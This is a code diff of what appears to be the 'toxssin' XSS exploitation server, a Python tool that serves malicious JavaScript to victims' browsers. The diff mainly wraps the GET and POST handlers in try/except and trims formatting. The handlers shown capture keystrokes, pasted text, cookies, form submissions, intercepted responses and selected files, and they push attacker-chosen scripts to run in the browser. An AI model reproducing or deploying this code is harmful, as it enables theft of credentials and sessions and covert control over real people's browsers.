@@ -346,317 +346,327 @@ class Toxssin(BaseHTTPRequestHandler):
 		
 	def do_GET(self):
 		
-		timestamp = datetime.now().timestamp()
-		global session_folder, msg_log, handler		
-		datetime_prefix = get_dt_prefix()		
-		self.server_version = "Apache/2.4.1"
-		self.sys_version = ""	
-		toxssin_id = self.headers.get("X-toxssin-id") if self.path != f'/{handler}' else ''
-		Toxssin.rst_promt_required = True if toxssin_id == Toxssin.active else False
-		
 		try:
-			if grab_poisoned and (len(toxssin_id) == 32) and (toxssin_id not in Toxssin.execution_verified) and (self.path != f'/{handler}'):
-				Toxssin.establish(toxssin_id, self.client_address[0], self.headers["Origin"], self.headers["User-Agent"], timestamp, grabbed = True)
-				rst_prompt(force_rst = True)
-				
-		except TypeError:
-			pass
-			
-		
-		if self.path == f'/{handler}':
-			
-			self.send_response(200)
-			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
-			self.send_header('Access-Control-Allow-Origin', '*')
-			self.end_headers()								
-			handler_src = open(f'./handler.js', 'r')
-			payload = handler_src.read()
-			handler_src.close()
-			payload = payload.replace('*TOXSSIN_SERVER*', Toxssin.preferences["*TOXSSIN_SERVER*"]).replace('*COOKIE_AGE*', cookie_age)			
-			self.wfile.write(bytes(payload, "utf-8"))
-			
-		
-		# toxin
-		elif re.search('c1cbfe271a40788a00e8bf8574d94d4b', self.path):
+			timestamp = datetime.now().timestamp()
+			global session_folder, msg_log, handler		
+			datetime_prefix = get_dt_prefix()		
+			self.server_version = "Apache/2.4.1"
+			self.sys_version = ""	
+			toxssin_id = self.headers.get("X-toxssin-id") if self.path != f'/{handler}' else ''
+			Toxssin.rst_promt_required = True if toxssin_id == Toxssin.active else False
 
-			session_data = self.path.split('/')
-			toxssin_id = session_data[2]
-			state = session_data[3]						
-			self.send_response(200)
-			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
-			self.send_header('Access-Control-Allow-Origin', '*') 
-			#self.send_header('Access-Control-Allow-Credentials', 'true')
-			self.send_header('Expires', 'Expires: Wed, 28 Oct 2050 11:00:00 GMT')
-			self.end_headers()
-								
-			toxin = open(f'./toxin.js', 'r')
-			js_poison = toxin.read()
-			toxin.close()
-			Toxssin.preferences["*SESSIONID*"] = toxssin_id
-			
-			for key, value in Toxssin.preferences.items():
-				js_poison = js_poison.replace(key, value)
-			
-			self.wfile.write(bytes(js_poison, "utf-8"))
-
-			# initiate logging
-			if toxssin_id not in Toxssin.execution_verified:
-				exists = False
-				Toxssin.establish(toxssin_id, self.client_address[0], self.headers["Origin"], self.headers["User-Agent"], timestamp)
-				
-			else:
-				exists = True
-			
-			if state == 'init':
-				echo_log(f'\r[{datetime_prefix[1]}] [{B_RED}{REQ}{B_END}] {BOLD}Received request for toxin! MITM attack launched against victims\'s browser!{END}', toxssin_id, echo = True)
-				rst_prompt()
-				
-			elif state == 'found' and exists:
-				echo_log(f'\r[{datetime_prefix[1]}] [{SPIDER}] {BOLD}Received request for toxin from an active session. XSS persistence was successful!{END}', toxssin_id, echo = True)
-				rst_prompt()
-				
-			elif state == 'found' and not exists:
-				echo_log(f'\r[{datetime_prefix[1]}] [{B_RED}{REQ}{B_END}] {BOLD}Received request for toxin from an older session. MITM attack launched against victims\'s browser!{END}', toxssin_id, echo = True)
-				rst_prompt()
-				
-			else:
-				echo_log(f'\r[{datetime_prefix[1]}] [{WARN}] {BOLD}Received request for toxin but session state was not determined.{END}', toxssin_id, echo = True)	
-			
-			if (state == 'init') or (state == 'found' and not exists):
-				state_msg = 'Being logged in the background' if Toxssin.active != toxssin_id else 'Currently in view (Active)'
-				echo_log(f'              ├─[{PURPLE}Client-IP{END}] -> {BOLD}{self.client_address[0]}{END}', toxssin_id, echo = True) #:{self.client_address[1]}
-				echo_log(f'              ├─[{PURPLE}Origin{END}] -> {BOLD}{self.headers["Origin"]}{END}', toxssin_id, echo = True)
-				echo_log(f'              ├─[{PURPLE}User-Agent{END}] -> {BOLD}{self.headers["User-Agent"]}{END}', toxssin_id, echo = True)
-				echo_log(f'              └─[{PURPLE}State{END}] -> {BOLD}{state_msg}{END}\n', toxssin_id, echo = True)
-				
-				rst_prompt(force_rst = True)
-
-
-		# Command exec
-		elif re.search('a95f7870b615a4df433314f10da26548', self.path):
-			
-			self.send_response(200)
-			self.send_header('Access-Control-Allow-Origin', '*')
-			path_to_cmd = False		
-			
-			if len(Toxssin.command_pool) > 0:
-				if any(toxssin_id in cmd for cmd in Toxssin.command_pool):
-					for i in range(0, len(Toxssin.command_pool)):
-						if toxssin_id in Toxssin.command_pool[i]:
-							path_to_cmd = Toxssin.command_pool.pop(i)[toxssin_id]
-							break
-							
-			path_to_cmd = 'None' if not path_to_cmd else path_to_cmd
-			self.send_header('Content-type', str(path_to_cmd)) if path_to_cmd != 'None' else self.send_header('Content-type', 'text/javascript; charset=UTF-8')			
-			self.end_headers()
-			
-			if path_to_cmd == 'None':
-				Toxssin.rst_promt_required = False
-				self.wfile.write(bytes("<%NoCmdIssued%>", "utf-8"))				
-				
-			else:
-				src = open(f'{path_to_cmd}', 'r')
-				payload = src.read()
-				src.close()				
-				self.wfile.write(bytes(payload, "utf-8"))				
-				
-	
-		elif toxssin_id in Toxssin.execution_verified:
-			
 			try:
-				self.send_response(200)
-				self.send_header('Content-type', 'text/javascript; charset=UTF-8')
-				self.send_header('Access-Control-Allow-Origin', self.headers.get('Origin'))
-				self.send_header('Access-Control-Allow-Credentials', 'true')
-				self.end_headers()
-				self.wfile.write(b'OK')
-				capture = base64.b64decode(self.path[1:]).decode("utf-8")
-				data = literal_eval('{' + unquote(capture.replace('%27', "\\'")) + '}')
-				
-				if data['event'] == 'keyup':
-					stroke = data['keystroke']
-					target = f'{ORANGE}Input{END}' if data['target'] == 'INPUT' else data['target'].capitalize()
-					targetName = f"[Name: {data['targetName']}]" if data['targetName'] != 'undefined' else ''					
-					echo_log(f'[{datetime_prefix[1]}] [{KEY}] [Type: {data["targetType"]}] [{target}]{targetName} {GREEN}{stroke}{END}', toxssin_id)
-					
-					
-				elif data['event'] == 'paste':
-					cb_data = data['data'].replace('<%LineBreak>', '\n')
-					target = f'{ORANGE}Input{END}' if data['target'] == 'INPUT' else data['target'].capitalize()
-					targetName = f"[Name: {data['targetName']}]" if data['targetName'] != 'undefined' else ''
-					echo_log(f'[{datetime_prefix[1]}] [{PASTE}] [{target}] {targetName} {GREEN}{cb_data}{END}', toxssin_id)
+				if grab_poisoned and (len(toxssin_id) == 32) and (toxssin_id not in Toxssin.execution_verified) and (self.path != f'/{handler}'):
+					Toxssin.establish(toxssin_id, self.client_address[0], self.headers["Origin"], self.headers["User-Agent"], timestamp, grabbed = True)
+					rst_prompt(force_rst = True)
 
-
-				elif data['event'] == 'input-changed':
-					targetName = f"[Name: {data['name']}]" if data['name'] != 'undefined' else ''
-					val = data["value"].replace("<%LineBreak>", "\n")	
-					echo_log(f'[{datetime_prefix[1]}] [{CHANGE}] [Type: {data["type"]}] {targetName} {GREEN}{val}{END}', toxssin_id)
-								
-					
-				elif data['event'] == 'cookie':
-					if Toxssin.victims[toxssin_id]['cookie'] == None:
-						echo_log(f'[{datetime_prefix[1]}] [{ORANGE}Cookie{END}] {GREEN}{data["data"]}{END}', toxssin_id)
-						Toxssin.victims[toxssin_id]['cookie'] = data["data"]
-						
-					elif Toxssin.victims[toxssin_id]['cookie'] not in [None, data["data"]]:
-						echo_log(f'[{datetime_prefix[1]}] [{ORANGE}Cookie-Value-Changed{END}] {GREEN}{data["data"]}{END}', toxssin_id)
-						Toxssin.victims[toxssin_id]['cookie'] = data["data"]
-						
-					else:
-						Toxssin.rst_promt_required = False
-						
-
-				elif data['event'] == 'info':
-					echo_log(f'[{datetime_prefix[1]}] [{INFO}] {data["msg"]}', toxssin_id)
-
-
-			except:
-				self.send_response(200)
-				self.send_header('Content-Type', 'text/plain')
-				self.end_headers()				
-				self.wfile.write(bytes(skull, 'utf-8'))
-				echo_log(f'[{datetime_prefix[1]}] [{INFO}] Received unandled request from {self.client_address[0]}', toxssin_id)		
+			except TypeError:
 				pass
 
-		else:
-			self.send_response(200)
-			self.end_headers()
-			self.wfile.write(b'UNDEFINED')
-			pass
 
-		rst_prompt()
+			if self.path == f'/{handler}':
+
+				self.send_response(200)
+				self.send_header('Content-type', 'text/javascript; charset=UTF-8')
+				self.send_header('Access-Control-Allow-Origin', '*')
+				self.end_headers()								
+				handler_src = open(f'./handler.js', 'r')
+				payload = handler_src.read()
+				handler_src.close()
+				payload = payload.replace('*TOXSSIN_SERVER*', Toxssin.preferences["*TOXSSIN_SERVER*"]).replace('*COOKIE_AGE*', cookie_age)			
+				self.wfile.write(bytes(payload, "utf-8"))
+
+
+			# toxin
+			elif re.search('c1cbfe271a40788a00e8bf8574d94d4b', self.path):
+
+				session_data = self.path.split('/')
+				toxssin_id = session_data[2]
+				state = session_data[3]						
+				self.send_response(200)
+				self.send_header('Content-type', 'text/javascript; charset=UTF-8')
+				self.send_header('Access-Control-Allow-Origin', '*') 
+				#self.send_header('Access-Control-Allow-Credentials', 'true')
+				self.send_header('Expires', 'Expires: Wed, 28 Oct 2050 11:00:00 GMT')
+				self.end_headers()
+
+				toxin = open(f'./toxin.js', 'r')
+				js_poison = toxin.read()
+				toxin.close()
+				Toxssin.preferences["*SESSIONID*"] = toxssin_id
+
+				for key, value in Toxssin.preferences.items():
+					js_poison = js_poison.replace(key, value)
+
+				self.wfile.write(bytes(js_poison, "utf-8"))
+
+				# initiate logging
+				if toxssin_id not in Toxssin.execution_verified:
+					exists = False
+					Toxssin.establish(toxssin_id, self.client_address[0], self.headers["Origin"], self.headers["User-Agent"], timestamp)
+
+				else:
+					exists = True
+
+				if state == 'init':
+					echo_log(f'\r[{datetime_prefix[1]}] [{B_RED}{REQ}{B_END}] {BOLD}Received request for toxin! MITM attack launched against victims\'s browser!{END}', toxssin_id, echo = True)
+					rst_prompt()
+
+				elif state == 'found' and exists:
+					echo_log(f'\r[{datetime_prefix[1]}] [{SPIDER}] {BOLD}Received request for toxin from an active session. XSS persistence was successful!{END}', toxssin_id, echo = True)
+					rst_prompt()
+
+				elif state == 'found' and not exists:
+					echo_log(f'\r[{datetime_prefix[1]}] [{B_RED}{REQ}{B_END}] {BOLD}Received request for toxin from an older session. MITM attack launched against victims\'s browser!{END}', toxssin_id, echo = True)
+					rst_prompt()
+
+				else:
+					echo_log(f'\r[{datetime_prefix[1]}] [{WARN}] {BOLD}Received request for toxin but session state was not determined.{END}', toxssin_id, echo = True)	
+
+				if (state == 'init') or (state == 'found' and not exists):
+					state_msg = 'Being logged in the background' if Toxssin.active != toxssin_id else 'Currently in view (Active)'
+					echo_log(f'              ├─[{PURPLE}Client-IP{END}] -> {BOLD}{self.client_address[0]}{END}', toxssin_id, echo = True) #:{self.client_address[1]}
+					echo_log(f'              ├─[{PURPLE}Origin{END}] -> {BOLD}{self.headers["Origin"]}{END}', toxssin_id, echo = True)
+					echo_log(f'              ├─[{PURPLE}User-Agent{END}] -> {BOLD}{self.headers["User-Agent"]}{END}', toxssin_id, echo = True)
+					echo_log(f'              └─[{PURPLE}State{END}] -> {BOLD}{state_msg}{END}\n', toxssin_id, echo = True)
+
+					rst_prompt(force_rst = True)
+
+
+			# Command exec
+			elif re.search('a95f7870b615a4df433314f10da26548', self.path):
+
+				self.send_response(200)
+				self.send_header('Access-Control-Allow-Origin', '*')
+				path_to_cmd = False		
+
+				if len(Toxssin.command_pool) > 0:
+					if any(toxssin_id in cmd for cmd in Toxssin.command_pool):
+						for i in range(0, len(Toxssin.command_pool)):
+							if toxssin_id in Toxssin.command_pool[i]:
+								path_to_cmd = Toxssin.command_pool.pop(i)[toxssin_id]
+								break
+
+				path_to_cmd = 'None' if not path_to_cmd else path_to_cmd
+				self.send_header('Content-type', str(path_to_cmd)) if path_to_cmd != 'None' else self.send_header('Content-type', 'text/javascript; charset=UTF-8')			
+				self.end_headers()
+
+				if path_to_cmd == 'None':
+					Toxssin.rst_promt_required = False
+					self.wfile.write(bytes("<%NoCmdIssued%>", "utf-8"))				
+
+				else:
+					src = open(f'{path_to_cmd}', 'r')
+					payload = src.read()
+					src.close()				
+					self.wfile.write(bytes(payload, "utf-8"))				
+
+
+			elif toxssin_id in Toxssin.execution_verified:
+
+				try:
+					self.send_response(200)
+					self.send_header('Content-type', 'text/javascript; charset=UTF-8')
+					self.send_header('Access-Control-Allow-Origin', self.headers.get('Origin'))
+					self.send_header('Access-Control-Allow-Credentials', 'true')
+					self.end_headers()
+					self.wfile.write(b'OK')
+					capture = base64.b64decode(self.path[1:]).decode("utf-8")
+					data = literal_eval('{' + unquote(capture.replace('%27', "\\'")) + '}')
+
+					if data['event'] == 'keyup':
+						stroke = data['keystroke']
+						target = f'{ORANGE}Input{END}' if data['target'] == 'INPUT' else data['target'].capitalize()
+						targetName = f"[Name: {data['targetName']}]" if data['targetName'] != 'undefined' else ''					
+						echo_log(f'[{datetime_prefix[1]}] [{KEY}] [Type: {data["targetType"]}] [{target}]{targetName} {GREEN}{stroke}{END}', toxssin_id)
+
+
+					elif data['event'] == 'paste':
+						cb_data = data['data'].replace('<%LineBreak>', '\n')
+						target = f'{ORANGE}Input{END}' if data['target'] == 'INPUT' else data['target'].capitalize()
+						targetName = f"[Name: {data['targetName']}]" if data['targetName'] != 'undefined' else ''
+						echo_log(f'[{datetime_prefix[1]}] [{PASTE}] [{target}] {targetName} {GREEN}{cb_data}{END}', toxssin_id)
+
+
+					elif data['event'] == 'input-changed':
+						targetName = f"[Name: {data['name']}]" if data['name'] != 'undefined' else ''
+						val = data["value"].replace("<%LineBreak>", "\n")	
+						echo_log(f'[{datetime_prefix[1]}] [{CHANGE}] [Type: {data["type"]}] {targetName} {GREEN}{val}{END}', toxssin_id)
+
+
+					elif data['event'] == 'cookie':
+						if Toxssin.victims[toxssin_id]['cookie'] == None:
+							echo_log(f'[{datetime_prefix[1]}] [{ORANGE}Cookie{END}] {GREEN}{data["data"]}{END}', toxssin_id)
+							Toxssin.victims[toxssin_id]['cookie'] = data["data"]
+
+						elif Toxssin.victims[toxssin_id]['cookie'] not in [None, data["data"]]:
+							echo_log(f'[{datetime_prefix[1]}] [{ORANGE}Cookie-Value-Changed{END}] {GREEN}{data["data"]}{END}', toxssin_id)
+							Toxssin.victims[toxssin_id]['cookie'] = data["data"]
+
+						else:
+							Toxssin.rst_promt_required = False
+
+
+					elif data['event'] == 'info':
+						echo_log(f'[{datetime_prefix[1]}] [{INFO}] {data["msg"]}', toxssin_id)
+
+
+				except:
+					self.send_response(200)
+					self.send_header('Content-Type', 'text/plain')
+					self.end_headers()				
+					self.wfile.write(bytes(skull, 'utf-8'))
+					echo_log(f'[{datetime_prefix[1]}] [{INFO}] Received unandled request from {self.client_address[0]}', toxssin_id)		
+					pass
+
+			else:
+				self.send_response(200)
+				self.end_headers()
+				self.wfile.write(b'UNDEFINED')
+				pass
+
+			rst_prompt()
+		
+		except:
+			pass
 
 		
 		
 	def do_POST(self):
-				
-		datetime_prefix = get_dt_prefix()
-		self.server_version = "Apache/2.4.1"
-		self.sys_version = ""
-		toxssin_id = self.headers.get("X-toxssin-id") if self.headers.get("X-toxssin-id") else ''
-		Toxssin.rst_promt_required = True if toxssin_id == Toxssin.active else False
-
+		
 		try:
-			if grab_poisoned and (len(toxssin_id) == 32) and (toxssin_id not in Toxssin.execution_verified) and (self.path != f'/{handler}'):
-				Toxssin.establish(toxssin_id, self.client_address[0], self.headers["Origin"], self.headers["User-Agent"], timestamp, grabbed = True)
-				
-		except TypeError:
+
+			datetime_prefix = get_dt_prefix()
+			self.server_version = "Apache/2.4.1"
+			self.sys_version = ""
+			toxssin_id = self.headers.get("X-toxssin-id") if self.headers.get("X-toxssin-id") else ''
+			Toxssin.rst_promt_required = True if toxssin_id == Toxssin.active else False
+
+			try:
+				if grab_poisoned and (len(toxssin_id) == 32) and (toxssin_id not in Toxssin.execution_verified) and (self.path != f'/{handler}'):
+					Toxssin.establish(toxssin_id, self.client_address[0], self.headers["Origin"], self.headers["User-Agent"], timestamp, grabbed = True)
+
+			except TypeError:
+				pass
+
+
+			# Form submission intercept
+			if self.path == '/d3cba2942555c79ce5b73193fd6f5614' and toxssin_id in Toxssin.execution_verified: 
+
+				self.send_response(200)
+				self.send_header('Access-Control-Allow-Origin', '*')
+				self.send_header('Content-Type', 'text/plain')
+				self.end_headers()
+				self.wfile.write(b'OK')
+				real_action = self.headers["Action"]
+				content_len = int(self.headers.get('Content-Length'))
+				form_attrs = {'Action':self.headers.get("X-form-action"), 'Method':self.headers.get("X-form-method"), 'Enctype':self.headers.get("X-form-enctype"), 'Encoding':self.headers.get("X-form-encoding")}
+				post_data = self.rfile.read(content_len)
+				echo_log(f'[{datetime_prefix[1]}] [{FORM}] ', toxssin_id, rst = False)				
+				echo_log('\r', toxssin_id, rst = False)
+
+				for attr in form_attrs.keys():
+					padding = ' ' * (8 - len(attr))
+					echo_log(f'  {BOLD}{padding}{attr.capitalize()}{END}: {GREEN}{form_attrs[attr]}{END}', toxssin_id, rst = False)
+
+				echo_log(f'  {BOLD}    Data{END}:\n', toxssin_id, rst = False)
+				log_capture('form-submission', ' '.join(datetime_prefix), post_data, form_attrs, toxssin_id)
+
+
+			# Response Intercept
+			elif self.path == '/1a60f7f722fd94513b92bd2b19c4f7d4' and toxssin_id in Toxssin.execution_verified: 
+
+				self.send_response(200)
+				self.send_header('Access-Control-Allow-Origin', '*')
+				self.send_header('Content-Type', 'text/plain')
+				self.end_headers()
+				self.wfile.write(b'OK')
+				content_len = int(self.headers.get('Content-Length'))
+				response_status_code = int(self.headers.get("X-form-status"))
+				response_status_text = 'Found (toxssin assumption)' if response_status_code == 302 else self.headers.get("X-form-statusText")
+				response_headers = f'Status: {response_status_code} {response_status_text}\n' + self.headers.get("X-form-responseHeaders").replace("<%LineBreak>", "\n")
+				post_data = self.rfile.read(content_len)
+
+				if self.headers.get('X-form-source') == 'link':
+					href = unquote(self.headers.get("X-form-href"))
+					echo_log(f'[{datetime_prefix[1]}] [{LINK}] {BOLD}User clicked a link with href = {END}{GREEN}{href}{END}', toxssin_id, rst = False)
+
+				if response_status_code == 302:
+					echo_log(f'[{datetime_prefix[1]}] [{RESPONSE}] {BOLD}Response seems to be a redirect (302 Found) to the same location.{END}', toxssin_id, rst = False)
+
+				else:
+					echo_log(f'[{datetime_prefix[1]}] [{RESPONSE}] ', toxssin_id, rst = False)
+
+				echo_log(f'\n  {BOLD}Response Headers:\n{END}', toxssin_id, rst = False)
+
+				for header in response_headers.split('\n'):
+					echo_log(f'  {header}', toxssin_id, green = True, rst = False)
+
+				echo_log(f'  {BOLD}Response Body:\n{END}', toxssin_id, rst = False)					
+				log_capture('response-intercept', f'{" ".join(datetime_prefix)}, href: {href}', post_data, response_headers, toxssin_id) if self.headers.get('X-form-source') == 'link' else log_capture('response-intercept', ' '.join(datetime_prefix), post_data, response_headers, toxssin_id)
+
+
+			# File selection intercept
+			elif self.path == '/7f30f7d702fd94515b82bd2b19c2f7d4' and toxssin_id in Toxssin.execution_verified:
+
+				self.send_response(200)
+				self.send_header('Access-Control-Allow-Origin', '*')
+				self.send_header('Content-Type', 'text/plain')
+				self.end_headers()
+				self.wfile.write(b'OK')
+				real_action = self.headers["Action"]
+				content_len = int(self.headers.get('Content-Length'))
+				post_data = self.rfile.read(content_len)
+				echo_log(f'[{datetime_prefix[1]}] [{FILE}] {BOLD}File name & Content{END} (Received via POST request):\n', toxssin_id, rst = False)				
+				log_capture('file-selection', ' '.join(datetime_prefix), post_data, real_action, toxssin_id)
+
+
+			# Table intercept
+			elif self.path == '/x8cwa2h4252tc79ce5b731r3fdc75483' and toxssin_id in Toxssin.execution_verified:
+
+				self.send_response(200)
+				self.send_header('Access-Control-Allow-Origin', '*')
+				self.send_header('Content-Type', 'text/plain')
+				self.end_headers()
+				self.wfile.write(b'OK')
+				real_action = self.headers["Action"]
+				content_len = int(self.headers.get('Content-Length'))
+				post_data = self.rfile.read(content_len)
+				echo_log(f'[{datetime_prefix[1]}] [{TABLE}] {BOLD}Table data{END} (Received via POST request):\n', toxssin_id, rst = False)				
+				log_capture('table', ' '.join(datetime_prefix), post_data, real_action, toxssin_id)			
+
+
+			# Script exec results
+			elif self.path == '/7f47fd7ae404fa7c0448863ac3db9c85' and toxssin_id in Toxssin.execution_verified and self.headers.get('X-form-script') not in ['null', None]:
+
+				self.send_response(200)
+				self.send_header('Access-Control-Allow-Origin', '*')
+				self.send_header('Content-Type', 'text/plain')
+				self.end_headers()
+				self.wfile.write(b'OK')
+				error_msg = 'without' if int(self.headers.get('X-form-error')) == 0 else f'{RED}with{END}'
+				script = self.headers.get('X-form-script')
+				content_len = int(self.headers.get('Content-Length'))
+				results = self.rfile.read(content_len)
+				try:
+					results = results.decode('utf-8') 
+				except UnicodeDecodeError:
+					echo_log(f'{ORANGE}Decoding data to UTF-8 failed. Printing raw data...{END}', toxssin_id)
+
+				echo_log(f'[{datetime_prefix[1]}] [{LPURPLE}Custom Script Exec{END}] [SID: {toxssin_id}] {BOLD}Script {ORANGE}{script}{END} {BOLD}executed {error_msg} {BOLD}error(s). Output{END}:\n{GREEN}{results}{END}', toxssin_id, echo = True, rst = False)
+				rst_prompt(force_rst = True)
+
+			else:
+				self.send_response(200)
+				self.end_headers()
+				self.wfile.write(b'UNDEFINED POST')
+				pass				
+
+			rst_prompt()
+			
+		except:
 			pass
 			
-			
-		# Form submission intercept
-		if self.path == '/d3cba2942555c79ce5b73193fd6f5614' and toxssin_id in Toxssin.execution_verified: 
-
-			self.send_response(200)
-			self.send_header('Access-Control-Allow-Origin', '*')
-			self.send_header('Content-Type', 'text/plain')
-			self.end_headers()
-			self.wfile.write(b'OK')
-			real_action = self.headers["Action"]
-			content_len = int(self.headers.get('Content-Length'))
-			form_attrs = {'Action':self.headers.get("X-form-action"), 'Method':self.headers.get("X-form-method"), 'Enctype':self.headers.get("X-form-enctype"), 'Encoding':self.headers.get("X-form-encoding")}
-			post_data = self.rfile.read(content_len)
-			echo_log(f'[{datetime_prefix[1]}] [{FORM}] ', toxssin_id, rst = False)				
-			echo_log('\r', toxssin_id, rst = False)
-			
-			for attr in form_attrs.keys():
-				padding = ' ' * (8 - len(attr))
-				echo_log(f'  {BOLD}{padding}{attr.capitalize()}{END}: {GREEN}{form_attrs[attr]}{END}', toxssin_id, rst = False)
-			
-			echo_log(f'  {BOLD}    Data{END}:\n', toxssin_id, rst = False)
-			log_capture('form-submission', ' '.join(datetime_prefix), post_data, form_attrs, toxssin_id)
-		
-		
-		# Response Intercept
-		elif self.path == '/1a60f7f722fd94513b92bd2b19c4f7d4' and toxssin_id in Toxssin.execution_verified: 
-
-			self.send_response(200)
-			self.send_header('Access-Control-Allow-Origin', '*')
-			self.send_header('Content-Type', 'text/plain')
-			self.end_headers()
-			self.wfile.write(b'OK')
-			content_len = int(self.headers.get('Content-Length'))
-			response_status_code = int(self.headers.get("X-form-status"))
-			response_status_text = 'Found (toxssin assumption)' if response_status_code == 302 else self.headers.get("X-form-statusText")
-			response_headers = f'Status: {response_status_code} {response_status_text}\n' + self.headers.get("X-form-responseHeaders").replace("<%LineBreak>", "\n")
-			post_data = self.rfile.read(content_len)
-			
-			if self.headers.get('X-form-source') == 'link':
-				href = unquote(self.headers.get("X-form-href"))
-				echo_log(f'[{datetime_prefix[1]}] [{LINK}] {BOLD}User clicked a link with href = {END}{GREEN}{href}{END}', toxssin_id, rst = False)
-			
-			if response_status_code == 302:
-				echo_log(f'[{datetime_prefix[1]}] [{RESPONSE}] {BOLD}Response seems to be a redirect (302 Found) to the same location.{END}', toxssin_id, rst = False)
-				
-			else:
-				echo_log(f'[{datetime_prefix[1]}] [{RESPONSE}] ', toxssin_id, rst = False)
-			
-			echo_log(f'\n  {BOLD}Response Headers:\n{END}', toxssin_id, rst = False)
-			
-			for header in response_headers.split('\n'):
-				echo_log(f'  {header}', toxssin_id, green = True, rst = False)
-						
-			echo_log(f'  {BOLD}Response Body:\n{END}', toxssin_id, rst = False)					
-			log_capture('response-intercept', f'{" ".join(datetime_prefix)}, href: {href}', post_data, response_headers, toxssin_id) if self.headers.get('X-form-source') == 'link' else log_capture('response-intercept', ' '.join(datetime_prefix), post_data, response_headers, toxssin_id)
-
-
-		# File selection intercept
-		elif self.path == '/7f30f7d702fd94515b82bd2b19c2f7d4' and toxssin_id in Toxssin.execution_verified:
-
-			self.send_response(200)
-			self.send_header('Access-Control-Allow-Origin', '*')
-			self.send_header('Content-Type', 'text/plain')
-			self.end_headers()
-			self.wfile.write(b'OK')
-			real_action = self.headers["Action"]
-			content_len = int(self.headers.get('Content-Length'))
-			post_data = self.rfile.read(content_len)
-			echo_log(f'[{datetime_prefix[1]}] [{FILE}] {BOLD}File name & Content{END} (Received via POST request):\n', toxssin_id, rst = False)				
-			log_capture('file-selection', ' '.join(datetime_prefix), post_data, real_action, toxssin_id)
-			
-			
-		# Table intercept
-		elif self.path == '/x8cwa2h4252tc79ce5b731r3fdc75483' and toxssin_id in Toxssin.execution_verified:
-
-			self.send_response(200)
-			self.send_header('Access-Control-Allow-Origin', '*')
-			self.send_header('Content-Type', 'text/plain')
-			self.end_headers()
-			self.wfile.write(b'OK')
-			real_action = self.headers["Action"]
-			content_len = int(self.headers.get('Content-Length'))
-			post_data = self.rfile.read(content_len)
-			echo_log(f'[{datetime_prefix[1]}] [{TABLE}] {BOLD}Table data{END} (Received via POST request):\n', toxssin_id, rst = False)				
-			log_capture('table', ' '.join(datetime_prefix), post_data, real_action, toxssin_id)			
-
-
-		# Script exec results
-		elif self.path == '/7f47fd7ae404fa7c0448863ac3db9c85' and toxssin_id in Toxssin.execution_verified and self.headers.get('X-form-script') not in ['null', None]:
-
-			self.send_response(200)
-			self.send_header('Access-Control-Allow-Origin', '*')
-			self.send_header('Content-Type', 'text/plain')
-			self.end_headers()
-			self.wfile.write(b'OK')
-			error_msg = 'without' if int(self.headers.get('X-form-error')) == 0 else f'{RED}with{END}'
-			script = self.headers.get('X-form-script')
-			content_len = int(self.headers.get('Content-Length'))
-			results = self.rfile.read(content_len)
-			try:
-				results = results.decode('utf-8') 
-			except UnicodeDecodeError:
-				echo_log(f'{ORANGE}Decoding data to UTF-8 failed. Printing raw data...{END}', toxssin_id)
-				
-			echo_log(f'[{datetime_prefix[1]}] [{LPURPLE}Custom Script Exec{END}] [SID: {toxssin_id}] {BOLD}Script {ORANGE}{script}{END} {BOLD}executed {error_msg} {BOLD}error(s). Output{END}:\n{GREEN}{results}{END}', toxssin_id, echo = True, rst = False)
-			rst_prompt(force_rst = True)
-	
-		else:
-			self.send_response(200)
-			self.end_headers()
-			self.wfile.write(b'UNDEFINED POST')
-			pass				
-			
-		rst_prompt()
 		
 
 	def do_OPTIONS(self):
@@ -702,18 +712,18 @@ def main():
 		s_url_list = toxssin_server_url.split(":")
 		handler_port = f':{s_url_list[2]}' if len(s_url_list) == 3 else ''
 			
-		print(f'[{get_dt_prefix()[1]}] [{INFO}] {BOLD}Provided domain handler URL{END}: {ORANGE}{toxssin_server_url}/{handler}{END}')
+		print(f'[{get_dt_prefix()[1]}] [{INFO}] Provided domain handler URL{END}: {ORANGE}{toxssin_server_url}/{handler}{END}')
 		
 		try:
 			server_public_ip = check_output("curl --connect-timeout 3.14 -s ifconfig.me", shell = True).decode(sys.stdout.encoding)	
-			print(f'[{get_dt_prefix()[1]}] [{INFO}] {BOLD}Public IP handler URL{END}: {ORANGE}https://{server_public_ip}{handler_port}/{handler}{END}')
+			print(f'[{get_dt_prefix()[1]}] [{INFO}] Public IP handler URL{END}: {ORANGE}https://{server_public_ip}{handler_port}/{handler}{END}')
 			
 		except:
 			pass
 			
-		print(f'[{get_dt_prefix()[1]}] [{INFO}] {BOLD}Type "help" to get a list of the available commands.{END}')
-		print(f'[{get_dt_prefix()[1]}] [{INFO}] {BOLD}All sessions are logged by default.{END}')
-		print(f'[{get_dt_prefix()[1]}] [{INFO}] {BOLD}Awaiting XSS GET request for {handler}{END}')
+		print(f'[{get_dt_prefix()[1]}] [{INFO}] Type "help" to get a list of the available commands.{END}')
+		print(f'[{get_dt_prefix()[1]}] [{INFO}] All sessions are logged by default.{END}')
+		print(f'[{get_dt_prefix()[1]}] [{INFO}] Awaiting XSS GET request for {handler}{END}')
 			
 		toxssin_server = Thread(target = httpd.serve_forever, args = ())
 		toxssin_server.daemon = True
